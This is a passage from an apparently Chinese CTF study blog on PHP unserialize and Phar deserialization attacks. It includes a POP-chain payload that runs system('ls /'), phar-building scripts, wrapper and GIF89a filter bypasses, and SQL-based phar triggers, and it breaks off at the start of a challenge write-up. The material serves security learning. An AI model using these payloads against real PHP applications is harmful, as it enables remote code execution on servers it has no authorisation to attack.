class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GOGOGO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dengchao</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Go Go Go~ 出发喽！&quot;</span> . <span class="variable language_">$this</span>-&gt;dengchao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouBao</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Dagongren</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Bagongren</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;Dagongren != <span class="variable language_">$this</span>-&gt;Bagongren) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Dagongren) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Bagongren)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Dagongren)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Bagongren)) )&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;dao, [<span class="string">&#x27;诗人我吃！&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HongCaFei</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei, [<span class="number">0</span> =&gt; <span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;What do you want to do?&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到<code>throw new Exception(&#39;What do you want to do?&#39;);</code>，很明显的GC回收机制：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GOGOGO</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dengchao</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouBao</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Dagongren</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Bagongren</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HongCaFei</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">HeiCaFei</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;HongCaFei = <span class="string">&#x27;system&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造 DouBao 对象</span></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">DouBao</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;Dagongren = [<span class="number">1</span>];   </span><br><span class="line"><span class="variable">$d</span>-&gt;Bagongren = [<span class="number">2</span>];</span><br><span class="line"><span class="variable">$d</span>-&gt;dao = [<span class="variable">$h</span>, <span class="string">&#x27;ls /&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造 GOGOGO 对象</span></span><br><span class="line"><span class="variable">$g</span> = <span class="keyword">new</span> <span class="title function_ invoke__">GOGOGO</span>();</span><br><span class="line"><span class="variable">$g</span>-&gt;dengchao = <span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">array</span>(<span class="variable">$g</span>,<span class="number">0</span>); <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//a:2:&#123;i:0;O:6:&quot;GOGOGO&quot;:1:&#123;s:8:&quot;dengchao&quot;;O:6:&quot;DouBao&quot;:3:&#123;s:3:&quot;dao&quot;;a:2:&#123;i:0;O:8:&quot;HeiCaFei&quot;:1:&#123;s:9:&quot;HongCaFei&quot;;s:6:&quot;system&quot;;&#125;i:1;s:4:&quot;ls /&quot;;&#125;s:9:&quot;Dagongren&quot;;a:1:&#123;i:0;i:1;&#125;s:9:&quot;Bagongren&quot;;a:1:&#123;i:0;i:2;&#125;&#125;&#125;i:1;i:0;&#125;</span></span><br></pre></td></tr></table></figure>
<p>然后将i:1改成i:0</p>
<p>即</p>
<p><code>data=a:2:&#123;i:0;O:6:&quot;GOGOGO&quot;:1:&#123;s:8:&quot;dengchao&quot;;O:6:&quot;DouBao&quot;:3:&#123;s:3:&quot;dao&quot;;a:2:&#123;i:0;O:8:&quot;HeiCaFei&quot;:1:&#123;s:9:&quot;HongCaFei&quot;;s:6:&quot;system&quot;;&#125;i:1;s:4:&quot;ls /&quot;;&#125;s:9:&quot;Dagongren&quot;;a:1:&#123;i:0;i:1;&#125;s:9:&quot;Bagongren&quot;;a:1:&#123;i:0;i:2;&#125;&#125;&#125;i:0;i:0;&#125;</code></p>
<h3 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53090346/article/details/127676088">文件上传与Phar反序列化的摩擦_[nssround#4 swpu]1zweb(revenge)-CSDN博客</a></p>
<p><code>php -d phar.readonly=0 class5.php</code>(核心出装)</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/122930867">phar反序列化+两道CTF例题_ctf phar-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6303">php反序列化拓展攻击详解—phar-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/305292.html">浅析Phar反序列化 - FreeBuf网络安全行业门户</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/2638#toc-0">Phar与Stream Wrapper造成PHP RCE的深入挖掘-先知社区</a></p>
<p><strong>phar</strong> 文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。<strong>当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容</strong>。(漏洞利用点)</p>
<h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p><strong>phar</strong> 归档的最佳特征是可以将多个文件组合成一个文件。 因此，phar 归档提供了在单个文件中分发完整的 PHP 应用程序并无需将其解压缩到磁盘而直接运行文件的方法。此外，phar 归档可以像任何其他文件一样由 PHP 在命令行和 Web 服务器上执行。phar 有点像 PHP 应用程序的移动存储器。（官网）</p>
<p>总而言之就是像file://或者data://这种流包装器，phar可以<strong>让多个文件归档到同一个文件</strong>，在<strong>不经过解压</strong>的情况下被php访问并执行</p>
<h5 id="标识"><a href="#标识" class="headerlink" title="标识"></a>标识</h5><ul>
<li>必须以<code>__HALT_COMPILER();?&gt;</code>来结尾</li>
<li>本质上是压缩文件，以序列化的形式储存在用户自定义的meta-data</li>
</ul>
<hr>
<h5 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h5><blockquote>
<ol>
<li>phar可以上传到服务器端(存在文件上传)</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且   <code>:</code>    <code>/</code>    <code>phar</code>   等特殊字符没有被过滤</li>
</ol>
</blockquote>
<hr>
<h5 id="phar生成"><a href="#phar生成" class="headerlink" title="phar生成"></a>phar生成</h5><p>注意php.ini中的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data=<span class="string">&#x27;hu3sky&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$c1e4r</span>); <span class="comment">//(根据题目来)触发的头是C1e4r类，所以传入C1e4r对象，将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名，添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>当环境限制了phar不能出现在前面的字符里。可以使用 <strong>compress.bzip2://</strong> 和 <strong>compress.zlib://</strong> 等绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br></pre></td></tr></table></figure>
<p>也可以利用其它协议</p>
<p><code>php://filter/read=convert.base64-encode/resource=phar://phar.phar</code></p>
<p>禁用了&lt;?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;  <span class="comment">//检查文件内容是否有&lt;?</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file_name = <span class="variable">$file_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go away!&quot;</span>); <span class="comment">//通过&quot;GIF89a&quot; . &quot;&lt; language=&#x27;php&#x27;&gt;__HALT_COMPILER();&lt;/&gt;&quot;绕waf</span></span><br></pre></td></tr></table></figure>
<p><strong>GIF格式验证</strong>可以通过在文件头部添加 <strong>GIF89a</strong> 绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(“GIF89a”.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="number">2</span>、生成一个phar.phar，修改后缀名为phar.gif</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span>-&gt;data=<span class="string">&#x27;hello L1n!&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="其他利用-sql"><a href="#其他利用-sql" class="headerlink" title="其他利用(sql)"></a>其他利用(sql)</h5><p><strong>Postgres</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;test&quot;, &quot;root&quot;, &quot;root&quot;));</span><br><span class="line">@$pdo-&gt;pgsqlCopyFromFile(&#x27;aa&#x27;, &#x27;phar://test.phar/aa&#x27;);</span><br></pre></td></tr></table></figure>
<p>当然，pgsqlCopyToFile和pg_trace同样也是能使用的，只是它们需要开启phar的写功能。</p>
<p><strong>MySQL</strong></p>
<p><code>LOAD DATA LOCAL INFILE</code>也会触发phar造成反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// $filename = &#x27;compress.zlib://phar://phar.phar/test.txt&#x27;;</span></span><br><span class="line">    <span class="comment">// file_get_contents($filename); </span></span><br><span class="line">    <span class="variable">$m</span> = <span class="title function_ invoke__">mysqli_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">mysqli_options</span>(<span class="variable">$m</span>, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">mysqli_real_connect</span>(<span class="variable">$m</span>, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="number">3306</span>);</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$m</span>, <span class="string">&#x27;LOAD DATA LOCAL INFILE \&#x27;phar://phar.phar/test.txt\&#x27; INTO TABLE users  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//执行一条 LOAD DATA LOCAL INFILE 语句，从 phar://phar.phar/test.txt 文件中加载数据到        &quot;users&quot; 表中，指定行终止符为 \r\n，忽略第一行数据。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18622173">国城杯 线下赛 web wp - LamentXU - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/51">SWPU 2018]SimplePHP | NSSCTF</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload Labs 2">SUCTF-2019/Web/Upload Labs 2 at master · team-su/SUCTF-2019</a></p>
<hr>
<h4 id="ezphar"><a href="#ezphar" class="headerlink" title="ezphar"></a>ezphar</h4><h5 id="BUUCTF在线评测-Ez-to-getFlag"><a href="#BUUCTF在线评测-Ez-to-getFlag" class="headerlink" title="BUUCTF在线评测 Ez to getFlag"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[DASCTF2022.07赋能赛]Ez to getflag">BUUCTF在线评测</a> Ez to getFlag</h5><p>查看页面源代码可以发现file.php</p>
<p>访问之后发现是把图片进行base64编码，想到访问index.php能把源码base64输出，这样我们就能查看到各个文件的源码了</p>
<p><strong>index.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">		&lt;title&gt;&lt;/title&gt;</span><br><span class="line">		&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;./css/iconfont.css&quot;</span>/&gt;</span><br><span class="line">		&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;./css/home.css&quot;</span>/&gt;</span><br><span class="line">		&lt;script src=<span class="string">&quot;js/jquery-3.2.0.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">background</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">nav</span>&quot;&gt;&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">find</span> <span class="title">active</span>&quot;&gt;图片查看&lt;/<span class="title">div</span>&gt;&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">upload</span>&quot;&gt;图片上传&lt;/<span class="title">div</span>&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">search</span>-<span class="title">box</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">box</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">search</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">search</span>&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">i</span> <span class="title">class</span>=&quot;<span class="title">iconfont</span> <span class="title">icon</span>-<span class="title">search</span>&quot;&gt;&lt;/<span class="title">i</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">id</span>=&#x27;<span class="title">upload</span>&#x27; <span class="title">class</span>=&quot;<span class="title">cover</span>&quot;&gt; </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">upload</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">file</span>&quot;&gt;文件名:&lt;/<span class="title">label</span>&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">file</span>&quot;&gt;&lt;<span class="title">br</span>&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;提交&quot;&gt; </span></span><br><span class="line"><span class="class">		&lt;/<span class="title">div</span>&gt; </span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mountain</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">m1</span> <span class="title">light</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">m2</span> <span class="title">light</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">m3</span> <span class="title">light</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">		